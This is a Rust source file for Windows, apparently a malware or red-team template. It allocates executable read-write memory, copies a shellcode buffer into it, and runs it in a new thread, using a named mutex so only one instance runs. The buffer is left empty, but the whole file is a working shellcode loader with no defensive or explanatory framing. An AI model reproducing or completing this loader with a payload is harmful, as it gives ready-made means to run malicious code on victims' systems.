#[allow(deprecated)]
use std::{ffi::CStr, intrinsics::copy_nonoverlapping, mem::transmute, ptr::null_mut};

use winapi::{shared::winerror::ERROR_ALREADY_EXISTS, um::{errhandlingapi::GetLastError, memoryapi::VirtualAlloc, processthreadsapi::CreateThread, synchapi::{CreateMutexA, CreateSemaphoreW, WaitForSingleObject}, winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}}};

const BUF: &[u8] = &[];


fn pause() {
    println!("[*] Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn inject() -> bool {
        unsafe {

        let paddress = VirtualAlloc(null_mut(), BUF.len(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

        if paddress.is_null() {
            println!("[-] VirtualAlloc failed with error: {}", GetLastError());
            return false;
        }

        println!("[+] Allocated memory at address: {:p}", paddress);

        copy_nonoverlapping(BUF.as_ptr(), paddress as *mut u8, BUF.len());

        let mut thread_id = 0;

        let h_thread = CreateThread(null_mut(), 0, Some(transmute(paddress)), null_mut(), 0, &mut thread_id);

        println!("[+] Created thread with thread ID: {}", thread_id);

        if h_thread.is_null() {
            println!("[-] CreateThread failed with error: {}", GetLastError());
            return false;
        }
        
        WaitForSingleObject(h_thread, 0xFFFFFFFF);

    }
    return true;
}

fn main() {

    unsafe {

        let h_mutex = CreateMutexA(null_mut(), 0, CStr::from_bytes_with_nul(b"Global\\MyMutex\0").unwrap().as_ptr());

        if h_mutex.is_null() {
            println!("[-] CreateMutexA failed with error: {}", GetLastError());
            return;
        }

        if !h_mutex.is_null() && GetLastError() == ERROR_ALREADY_EXISTS {
            println!("[-] Another instance of the program is already running.");
            return;
        }

    }   


    if inject() {
        println!("[+] Shellcode executed successfully!");
    } else {
        println!("[-] Shellcode execution failed.");
    }

    pause();

}